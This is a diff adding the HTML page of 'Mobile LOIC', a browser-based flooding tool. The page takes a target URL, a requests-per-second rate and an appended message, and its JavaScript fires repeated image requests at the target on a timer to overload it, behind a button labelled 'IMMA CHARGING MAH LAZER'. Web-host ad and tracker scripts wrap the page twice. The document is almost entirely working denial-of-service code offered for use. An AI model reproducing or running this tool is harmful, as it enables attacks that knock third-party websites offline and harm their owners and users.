@@ -1,0 +1,472 @@
+
+<html><head></head><body style='background: black; margin: 0;'><table height='100%' width='100%' cellspacing='0' cellpadding='0'><tbody><tr><td align='center' valign='middle'>
+			<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<title>Mobile LOIC</title>
+
+<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
+
+<style type="text/css">
+
+html, body, form, fieldset, p, div, h1, h2, h3, h4, h5, h6 {
+
+	margin: 0;
+
+	padding: 0;
+
+	-webkit-text-size-adjust: none;
+
+}
+
+
+
+body {
+
+	background: #d7d7d7;
+
+	color: #000000;
+
+	font-family: Helvetica;
+
+	font-size: 16px;
+
+}
+
+
+
+
+
+a:link, a:hover, a:active, a:visited {
+
+	text-decoration: none;
+
+	color: #578aad;
+
+}
+
+
+
+input {
+
+	width: 250px;
+
+	height: 30px;
+
+	font-size: 20px;
+
+	font-weight: bold;
+
+}
+
+
+
+button {
+
+	width: 250px;
+
+	height: 60px;
+
+	font-size: 20px;
+
+	font-weight: bold;
+
+}
+
+
+
+h1 {
+
+	background: #d7d7d7;
+
+	color: #000000;
+
+	font-size: 45px;
+
+	font-weight: bold;	
+
+}
+
+
+
+#container {
+
+	padding-top: 20px;
+
+	overflow: auto;
+
+	text-align: center;
+
+}
+
+
+
+#section {
+
+	background: #cbc9c9;
+
+	margin: 10px;
+
+	padding: 10px;
+
+	border-radius: 10px;
+
+	-moz-border-radius: 10px;
+
+	-webkit-border-radius: 10px;
+
+}
+
+
+
+.title {
+
+	color: #000000;
+
+	font-size: 16px;
+
+	font-weight: bold;
+
+	font-style: italic;
+
+	padding-bottom: 5px;
+
+}
+
+
+
+.required {
+
+	color: #d74646;
+
+	font-size: 25px;
+
+	font-weight: bold;
+
+	font-style: italic;
+
+}
+
+
+
+.success {
+
+	color: #8cbc26;
+
+	font-size: 16px;
+
+	font-weight: bold;
+
+	font-style: italic;
+
+	padding-bottom: 5px;
+
+}
+
+
+
+.failed {
+
+	color: #d74646;
+
+	font-size: 16px;
+
+	font-weight: bold;
+
+	font-style: italic;
+
+	padding-bottom: 5px;
+
+}
+
+
+
+.number {
+
+	color: #363635;
+
+	font-family: Helvetica;
+
+	font-size: 40px;
+
+	font-weight: bold;
+
+	padding-bottom: 5px;
+
+}
+
+
+
+#footer {
+
+	color: #363635;
+
+	font-size: 12px;
+
+	font-style: italic;
+
+	margin-bottom: 10px;
+
+}
+
+
+
+</style>
+
+</head>
+
+
+
+<body>
+
+<div id="container">
+
+<h1>Mobile LOIC</h1>
+
+
+
+<div id="section">
+
+
+
+<div class="title">Target URL<span class="required">*</span></div>
+
+<input type="text" id="targetURL" value="" />
+
+</div>
+
+
+
+<div id="section">
+
+<div class="title">Requests per Second</div>
+
+<input type="text" id="rps" value="10" style="" />
+
+</div>
+
+
+
+<div id="section">
+
+<div class="title">Append Message</div>
+
+<input type="text" id="message" style="" />
+
+</div>
+
+
+
+<div id="section">
+
+<button id="fireButton" style="">IMMA CHARGING MAH LAZER</button>
+
+</div>
+
+
+
+<div id="section">
+
+<div class="title">Requested</div>
+
+<div class="number" id="requestedCtr">0</div>
+
+<div class="success">Succeeded</div>
+
+<div class="number" id="succeededCtr">0</div>
+
+<div class="failed">Failed</div>
+
+
+
+<div class="number" id="failedCtr">0</div>
+
+</div>
+
+
+
+<div id="footer">Development at <a href="https://github.com/Snapple/Mobile-LOIC/">Mobile LOIC Github</a></div>
+
+</div>
+
+
+
+<noframes></noframes><noscript></noscript><!-- --><script type="text/javascript" src="http://www.freewebs.com/p.js"></script><script>
+
+       (function () {
+
+
+
+            var fireInterval;
+
+            var isFiring = false;
+
+
+
+            var requestedCtrNode = document.getElementById("requestedCtr"),
+
+                succeededCtrNode = document.getElementById("succeededCtr"),
+
+                failedCtrNode = document.getElementById("failedCtr"),
+
+                targetURLNode = document.getElementById("targetURL"),
+
+                fireButton = document.getElementById("fireButton"),
+
+                messageNode = document.getElementById("message"),
+
+                rpsNode = document.getElementById("rps"),
+
+                timeoutNode = document.getElementById("timeout");
+
+
+
+            var targetURL = targetURLNode.value;
+
+            targetURLNode.onchange = function () {
+
+                targetURL = this.value;
+
+            };
+
+
+
+            var requestsHT = {}; // requests hash table, may come in handy later
+
+
+
+            var requestedCtr = 0,
+
+                succeededCtr = 0,
+
+                failedCtr = 0;
+
+
+
+            var makeHttpRequest = function () {
+
+				
+
+					if (requestedCtr > failedCtr + succeededCtr + 1000) { //Allow no more than 1000 hung requests
+
+						return;
+
+					};
+
+					
+
+                    var rID =Number(new Date());
+
+                    var img = new Image();
+
+                    img.onerror = function () { onFail(rID); };
+
+                    img.onabort = function () { onFail(rID); };
+
+                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
+
+					
+
+					img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+
+                    requestsHT[rID] = img;
+
+                    onRequest(rID);
+
+                };
+
+
+
+            var onRequest = function (rID) {
+
+                    requestedCtr++;
+
+                    requestedCtrNode.innerHTML = requestedCtr;
+
+                };
+
+
+
+            var onComplete = function (rID) {
+
+                    delete requestsHT[rID];
+
+                };
+
+
+
+            var onFail = function (rID) {
+
+                   // failedCtr++;
+
+                    //failedCtrNode.innerHTML = failedCtr;
+
+					
+
+					succeededCtr++; //Seems like the url will always fail it it isn't an image
+
+                    succeededCtrNode.innerHTML = succeededCtr;
+
+
+
+
+
+                    delete requestsHT[rID]; // we can't keep it forever or it would blow up the browser
+
+                };
+
+
+
+            var onSuccess = function (rID) {
+
+                    succeededCtr++;
+
+                    succeededCtrNode.innerHTML = succeededCtr;
+
+                    delete requestsHT[rID];
+
+                };
+
+
+
+            fireButton.onclick = function () {
+
+                if (isFiring) {
+
+                    clearInterval(fireInterval);
+
+
+
+                    isFiring = false;
+
+                    this.innerHTML = "IMMA CHARGING MAH LAZER";
+
+                } else {
+
+                    isFiring = true;
+
+                    this.innerHTML = "STOP TEH FLOODING";
+
+
+
+                    fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
+
+                }
+
+            };
+
+
+
+        })();
+
+</script>
+
+
+
+<!-- --><script type="text/javascript" src="http://static.websimages.com/static/global/js/webs/usersites/escort.js"></script><script type="text/javascript">if(typeof(urchinTracker)=='function'){_uacct="UA-230305-2";_udn="none";_uff=false;urchinTracker();}</script></body>
+
+</html>
+</td></tr></tbody></table><!-- --><script type="text/javascript" src="http://static.websimages.com/static/global/js/webs/usersites/escort.js"></script><script type="text/javascript">if(typeof(urchinTracker)=='function'){_uacct="UA-230305-2";_udn="none";_uff=false;urchinTracker();}</script></body></html>
